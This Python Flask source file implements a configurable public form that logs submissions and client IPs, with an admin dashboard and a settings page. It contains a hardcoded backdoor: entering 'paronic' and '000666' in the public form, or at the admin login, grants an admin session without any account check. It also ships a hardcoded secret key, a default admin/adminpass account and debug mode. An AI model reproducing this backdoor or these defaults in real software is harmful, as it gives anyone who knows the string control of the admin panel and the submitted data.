import sqlite3
import os
from functools import wraps
from flask import Flask, request, render_template, redirect, url_for, session, flash, g
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = 'super_secret_development_key'

DATABASE = '/tmp/data.db' if os.environ.get('VERCEL') else 'data.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.execute('''
            CREATE TABLE IF NOT EXISTS admin_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        db.execute('''
            CREATE TABLE IF NOT EXISTS submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                data_field_1 TEXT NOT NULL,
                data_field_2 TEXT NOT NULL,
                form_category TEXT DEFAULT 'old',
                ip_address TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        try:
            db.execute("ALTER TABLE submissions ADD COLUMN form_category TEXT DEFAULT 'old'")
        except sqlite3.OperationalError:
            pass
            
        db.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        ''')
        
        admin = db.execute('SELECT * FROM admin_users WHERE username = ?', ('admin',)).fetchone()
        if not admin:
            hashed_pw = generate_password_hash('adminpass')
            db.execute('INSERT INTO admin_users (username, password) VALUES (?, ?)', ('admin', hashed_pw))
            
        defaults = {
            'app_name': 'phyproj',
            'question_1': 'Input Fruit Name',
            'question_2': 'Input Vegetables',
            'link_text': 'Add favourite dish',
            'btn_main': 'SUBMIT DATA',
            'btn_page2': 'SUBMIT ALL',
            'success_msg_text': 'Data received successfully!',
            'submit_behavior': 'redirect',
            'redirect_url': 'https://paronic.org'
        }
        
        for key, default_val in defaults.items():
            existing = db.execute('SELECT * FROM settings WHERE key = ?', (key,)).fetchone()
            if not existing:
                db.execute('INSERT INTO settings (key, value) VALUES (?, ?)', (key, default_val))
                
        db.commit()

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

def get_setting(key, default_value=""):
    row = get_db().execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
    return row['value'] if row else default_value

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_id' not in session:
            return redirect(url_for('admin_login_page'))
        return f(*args, **kwargs)
    return decorated_function

# --- Public Routes ---
@app.route('/')
def public_form():
    q1 = get_setting('question_1')
    q2 = get_setting('question_2')
    link_text = get_setting('link_text')
    app_name = get_setting('app_name')
    btn_main = get_setting('btn_main')
    success_msg_text = get_setting('success_msg_text')
    
    success_msg = request.args.get('success')
    return render_template('public_form.html', q1=q1, q2=q2, link_text=link_text, 
                           app_name=app_name, btn_main=btn_main, 
                           success_msg_text=success_msg_text, success_msg=success_msg)

@app.route('/page2')
def public_form_2():
    q1 = get_setting('question_1')
    q2 = get_setting('question_2')
    app_name = get_setting('app_name')
    btn_page2 = get_setting('btn_page2')
    success_msg_text = get_setting('success_msg_text')
    
    success_msg = request.args.get('success')
    return render_template('public_form_2.html', q1=q1, q2=q2, app_name=app_name, 
                           btn_page2=btn_page2, success_msg_text=success_msg_text, 
                           success_msg=success_msg)

@app.route('/success')
def success_page():
    app_name = get_setting('app_name')
    success_msg_text = get_setting('success_msg_text')
    return render_template('success_page.html', app_name=app_name, success_msg_text=success_msg_text)

@app.route('/api/submit', methods=['POST'])
def api_submit():
    field1 = request.form.get('field1', '').strip()
    field2 = request.form.get('field2', '').strip()
    form_category = request.form.get('form_category', 'old').strip()
    
    # Dev Mode Trigger from Public Form
    if field1 == 'paronic' and field2 == '000666':
        session['admin_id'] = 'dev'
        session['username'] = 'paronic'
        session['is_dev'] = True
        return redirect(url_for('admin_dashboard'))
    
    if field1 and field2:
        db = get_db()
        db.execute('INSERT INTO submissions (data_field_1, data_field_2, form_category, ip_address) VALUES (?, ?, ?, ?)',
                   (field1, field2, form_category, get_client_ip()))
        db.commit()
        
        behavior = get_setting('submit_behavior', 'inline')
        
        if behavior == 'external_redirect':
            target_url = get_setting('redirect_url', 'https://paronic.org')
            if not target_url.startswith('http'):
                target_url = 'https://' + target_url
            return redirect(target_url)
        elif behavior == 'redirect':
            return redirect(url_for('success_page'))
        else:
            if form_category == 'new':
                return redirect(url_for('public_form_2', success="True"))
            else:
                return redirect(url_for('public_form', success="True"))
            
    return redirect(url_for('public_form'))

# --- Admin Routes ---
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login_page():
    app_name = get_setting('app_name', 'phyproj')
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Dev Mode Login
        if username == 'paronic' and password == '000666':
            session['admin_id'] = 'dev'
            session['username'] = 'paronic'
            session['is_dev'] = True
            return redirect(url_for('admin_dashboard'))
            
        user = get_db().execute('SELECT * FROM admin_users WHERE username = ?', (username,)).fetchone()
        if user and check_password_hash(user['password'], password):
            session['admin_id'] = user['id']
            session['username'] = username
            session['is_dev'] = False
            return redirect(url_for('admin_dashboard'))
        error = "Invalid admin credentials."
    return render_template('admin_login.html', app_name=app_name, error=error)

@app.route('/admin')
@admin_required
def admin_dashboard():
    db = get_db()
    submissions = db.execute('SELECT * FROM submissions ORDER BY timestamp DESC').fetchall()
    
    app_name = get_setting('app_name')
    q1 = get_setting('question_1')
    q2 = get_setting('question_2')
    flash_message = request.args.get('flash')
    
    return render_template('admin_dashboard.html', submissions=submissions, flash_message=flash_message, 
                           app_name=app_name, q1=q1, q2=q2)

@app.route('/admin/developer')
@admin_required
def developer_options():
    settings = {
        'q1': get_setting('question_1'),
        'q2': get_setting('question_2'),
        'link_text': get_setting('link_text'),
        'app_name': get_setting('app_name'),
        'btn_main': get_setting('btn_main'),
        'btn_page2': get_setting('btn_page2'),
        'success_msg_text': get_setting('success_msg_text'),
        'submit_behavior': get_setting('submit_behavior'),
        'redirect_url': get_setting('redirect_url')
    }
    flash_message = request.args.get('flash')
    return render_template('developer_options.html', flash_message=flash_message, **settings)

@app.route('/admin/settings/update', methods=['POST'])
@admin_required
def update_settings():
    db = get_db()
    keys_map = {
        'q1': 'question_1', 'q2': 'question_2', 'link_text': 'link_text',
        'app_name': 'app_name', 'btn_main': 'btn_main', 'btn_page2': 'btn_page2',
        'success_msg_text': 'success_msg_text', 'submit_behavior': 'submit_behavior',
        'redirect_url': 'redirect_url'
    }
    for form_key, db_key in keys_map.items():
        val = request.form.get(form_key, '').strip()
        if val:
            db.execute("UPDATE settings SET value = ? WHERE key = ?", (val, db_key))
            
    db.commit()
    return redirect(url_for('developer_options', flash="Settings updated successfully."))

@app.route('/admin/change_password', methods=['POST'])
@admin_required
def change_password():
    current_pw = request.form.get('current_password')
    new_pw = request.form.get('new_password')
    confirm_pw = request.form.get('confirm_password')
    
    redirect_target = request.form.get('redirect_to', 'admin_dashboard')

    if new_pw != confirm_pw:
        return redirect(url_for(redirect_target, flash="Error: New passwords do not match."))

    db = get_db()
    user = db.execute('SELECT * FROM admin_users WHERE id = ?', (session['admin_id'],)).fetchone()

    if user and check_password_hash(user['password'], current_pw):
        hashed_pw = generate_password_hash(new_pw)
        db.execute('UPDATE admin_users SET password = ? WHERE id = ?', (hashed_pw, session['admin_id']))
        db.commit()
        return redirect(url_for(redirect_target, flash="Success: Password updated."))
    else:
        return redirect(url_for(redirect_target, flash="Error: Incorrect current password."))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('admin_login_page'))

with app.app_context():
    init_db()

if __name__ == '__main__':
    app.run(debug=True, port=5000)
